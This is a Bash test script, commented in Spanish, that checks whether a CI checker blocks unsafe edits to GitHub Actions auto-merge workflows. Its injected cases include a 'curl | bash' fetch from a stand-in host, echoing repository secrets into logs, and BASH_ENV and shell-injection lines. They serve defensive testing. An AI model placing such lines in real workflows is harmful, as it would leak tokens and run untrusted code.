#!/usr/bin/env bash
# Prueba check-puerta-fusion.sh: con los workflows reales pasa, y con cada caso malo falla, y por su motivo.
set -uo pipefail
dir="${1:?carpeta de workflows}"
check="$(dirname "$0")/check-puerta-fusion.sh"
tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT
mal=0

bash "$check" "$dir" > /dev/null || { echo "::error::El comprobador falla con los workflows reales."; mal=1; }

caso() {   # caso <nombre> <fichero> <sed> <texto que tiene que salir en el rechazo>
  rm -rf "$tmp/w"; cp -r "$dir" "$tmp/w"
  sed -i "$3" "$tmp/w/$2"
  if cmp -s "$dir/$2" "$tmp/w/$2"; then echo "::error::Caso '$1': el sed no cambió nada."; mal=1; return; fi
  if bash "$check" "$tmp/w" > "$tmp/salida" 2>&1; then
    echo "::error::Caso '$1': el comprobador lo deja pasar."; mal=1
  elif ! grep -qF -- "$4" "$tmp/salida"; then
    cat "$tmp/salida"; echo "::error::Caso '$1': rechazado, pero no por '$4'."; mal=1
  else
    echo "Caso '$1': rechazado por '$4'."
  fi
}
U='descarga o ejecuta código'
E='el token sólo en el job con environment: automerge'
S='          set -euo pipefail'
caso 'ci.yml con un secreto'             ci.yml          's#^      - uses: actions/setup-dotnet@v6#      - run: echo ${{ secrets.AUTOMERGE_TOKEN }}\n      - uses: actions/setup-dotnet@v6#' 'ci.yml nombra secretos'
caso 'ci.yml con toJSON(secrets)'        ci.yml          's#^      - uses: actions/setup-dotnet@v6#      - run: echo "${{ toJSON(secrets) }}"\n      - uses: actions/setup-dotnet@v6#' 'ci.yml nombra secretos'
caso 'ci.yml con secrets: inherit'       ci.yml          '0,/^    runs-on: ubuntu-latest/s##    secrets: inherit\n    runs-on: ubuntu-latest#' 'ci.yml nombra secretos'
caso 'otro workflow con un secreto'      auto-pr.yml     's#^jobs:#env:\n  X: ${{ secrets.AUTOMERGE_TOKEN }}\njobs:#' 'auto-pr.yml nombra secretos'
caso 'ci.yml sin permissions'            ci.yml          '/^permissions:/,/^  contents: read/d' 'no tiene bloque permissions'
caso 'auto-merge con otro secreto'       auto-merge.yml  's#secrets.AUTOMERGE_TOKEN#secrets.OTRO_TOKEN#' 'sólo puede nombrar AUTOMERGE_TOKEN'
caso 'auto-merge con toJSON(secrets)'    auto-merge.yml  "0,/^$S/s##$S\n          echo \"\${{ toJSON(secrets) }}\"#" 'sólo puede nombrar AUTOMERGE_TOKEN'
caso 'token sin el entorno'              auto-merge.yml  '/^    environment: automerge/d' "$E"
caso 'token en el job que decide'        auto-merge.yml  's#GH_TOKEN: ${{ github.token }}#GH_TOKEN: ${{ secrets.AUTOMERGE_TOKEN }}#' "$E"
caso 'entorno en el job que decide'      auto-merge.yml  's#^  decidir:#  decidir:\n    environment: automerge#' "$E"
caso 'entorno con otra forma'            auto-merge.yml  's#^    environment: automerge#    environment:\n      name: automerge#' "$E"
caso 'auto-merge hace checkout'          auto-merge.yml  '0,/^    steps:/s##    steps:\n      - uses: actions/checkout@v7#' "$U"
caso 'auto-merge usa github-script'      auto-merge.yml  '0,/^    steps:/s##    steps:\n      - uses: actions/github-script@v8#' "$U"
caso 'auto-merge con git fetch'          auto-merge.yml  "0,/^$S/s##$S\n          git fetch -q origin \"\$SHA_CI\"#" "$U"
caso 'auto-merge ejecuta dotnet'         auto-merge.yml  "0,/^$S/s##$S\n          dotnet build#" "$U"
caso 'auto-merge ejecuta un script'      auto-merge.yml  "0,/^$S/s##$S\n          ./scripts/algo.sh#" "$U"
caso 'auto-merge con curl | bash'        auto-merge.yml  "0,/^$S/s##$S\n          curl -s https://x.test/a | bash#" "$U"
caso 'auto-merge con gh run download'    auto-merge.yml  "0,/^$S/s##$S\n          gh run download 1 -R x/y#" "$U"
caso 'auto-merge con gh pr checkout'     auto-merge.yml  "0,/^$S/s##$S\n          gh pr checkout 1#" "$U"
caso 'auto-merge lee el código por API'  auto-merge.yml  "0,/^$S/s##$S\n          gh api repos/x/y/contents/a.props#" "$U"
caso 'auto-merge escribe BASH_ENV'       auto-merge.yml  "0,/^$S/s##$S\n          echo \"BASH_ENV=/tmp/x\" >> \"\$GITHUB_ENV\"#" "$U"
caso 'auto-merge con gh api graphql'     auto-merge.yml  "0,/^$S/s##$S\n          gh api graphql -f query=x#" "$U"
caso 'auto-merge con \$SHELL -c'         auto-merge.yml  "0,/^$S/s##$S\n          \"\$SHELL\" -c x#" "$U"
caso 'sin filtro de ficheros'            auto-merge.yml  '/^          sensibles=\$(jq -r/,/^            | .filename/d' 'ya no tiene la línea de la puerta'
caso 'filtro sin nuget.config'           auto-merge.yml  's#|(^|/)nuget\\\\.config\$##' 'ya no tiene la línea de la puerta'
caso 'sin changed_files'                 auto-merge.yml  's#\.changed_files#.additions#g' 'ya no tiene la línea de la puerta'
caso 'sin la comprobación de la mayor'   auto-merge.yml  's#no "el PR \#\$numero cambia la versión mayor#echo "#' 'ya no tiene la línea de la puerta'
caso 'merge normal'                      auto-merge.yml  's#merge_method=rebase#merge_method=merge#' 'ya no tiene la línea de la puerta'
caso 'sin el SHA'                        auto-merge.yml  's# -f sha="\$SHA_CI"##' 'ya no tiene la línea de la puerta'
caso 'token en el env global'           auto-merge.yml  's#^  REPO: ${{ github.repository }}#  REPO: ${{ github.repository }}\n  T: ${{ secrets.AUTOMERGE_TOKEN }}#' 'nombra el secreto fuera de los jobs'
caso 'continue-on-error al fusionar'     auto-merge.yml  's#^      - name: Fusionar#      - name: Fusionar\n        continue-on-error: true#' 'continue-on-error'
caso 'auto-merge con . fichero'          auto-merge.yml  "0,/^$S/s##$S\n          . \"\$RUNNER_TEMP/x\"#" "$U"
caso 'sin la lista blanca de MSBuild'    auto-merge.yml  's#no "el PR \#\$numero cambia MSBuild más allá de la versión#echo "#' 'ya no tiene la línea de la puerta'
caso 'MSBuild sin mirar el patch null'   auto-merge.yml  's#.status != "modified" or .patch == null#.status == "nada"#' 'ya no tiene la línea de la puerta'
caso 'ficheros de otro PR'               auto-merge.yml  's#repos/$REPO/pulls/$numero/files#repos/$REPO/pulls/1/files#' 'ya no tiene la línea de la puerta'
exit "$mal"
